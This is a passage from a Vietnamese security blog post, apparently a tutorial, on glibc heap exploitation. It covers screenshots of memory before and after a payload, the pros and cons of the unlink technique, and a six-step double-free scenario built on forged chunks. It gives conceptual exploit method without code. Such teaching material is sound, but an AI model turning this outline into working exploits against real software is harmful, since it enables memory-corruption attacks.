<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?ssl=1" rel="attachment wp-att-506"><img data-attachment-id="506" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/before/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?fit=689%2C459&amp;ssl=1" data-orig-size="689,459" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="before" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?fit=300%2C200&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?fit=604%2C402&amp;ssl=1" class="alignnone size-full wp-image-506" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?resize=604%2C402&#038;ssl=1" alt="before" width="604" height="402" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?w=689&amp;ssl=1 689w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/before.png?resize=300%2C200&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>Trước khi nhập payload</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?ssl=1" rel="attachment wp-att-507"><img data-attachment-id="507" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/before2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?fit=688%2C461&amp;ssl=1" data-orig-size="688,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="before2" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?fit=300%2C201&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?fit=604%2C405&amp;ssl=1" class="alignnone size-full wp-image-507" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?resize=604%2C405&#038;ssl=1" alt="before2" width="604" height="405" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?w=688&amp;ssl=1 688w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/04/before2.png?resize=300%2C201&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>Sau khi free</p>
<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?ssl=1" rel="attachment wp-att-508"><img data-attachment-id="508" data-permalink="https://babyphd.net/2016/04/07/unlink-technique/after/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?fit=689%2C461&amp;ssl=1" data-orig-size="689,461" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="after" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?fit=300%2C201&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?fit=604%2C404&amp;ssl=1" class="alignnone size-full wp-image-508" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?resize=604%2C404&#038;ssl=1" alt="after" width="604" height="404" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?w=689&amp;ssl=1 689w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/04/after.png?resize=300%2C201&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>-&gt; Ưu điểm: Có thể viết bất nơi đâu mà không làm hỏng vùng nhớ xung quanh nó.</p>
<p>-&gt; Nhược điểm: Thông thường chương trình phải có nơi lưu lại địa chỉ của các heapchunk.</p>
<p>&nbsp;</p>
<h1>Double free</h1>
<p>Đây là lỗi khi mà hàm free() thực hiện thao tác free đối vs 1 đối tượng 2 lần. Về cơ bản, thao tác tạo chunk giả để unlink cũng giống với heap overflow, nhưng kịch bản ở đây sẽ khác:</p>
<ul>
<li>Malloc chunk1 có kích thước 0x80</li>
<li>Malloc chunk2 có kích thước 0x80</li>
<li>Free chunk2 và chunk1</li>
<li>Malloc chunk3 có kích thước 0x100</li>
<li>Tạo chunk1 giả và chunk2 giả trong lòng chunk3</li>
<li>Free chunk2</li>
</ul>
<p>&nbsp;</p>
<p><em><strong>REFERENCES:  <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a></strong></em></p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">498</post-id>	</item>
	</channel>
</rss>
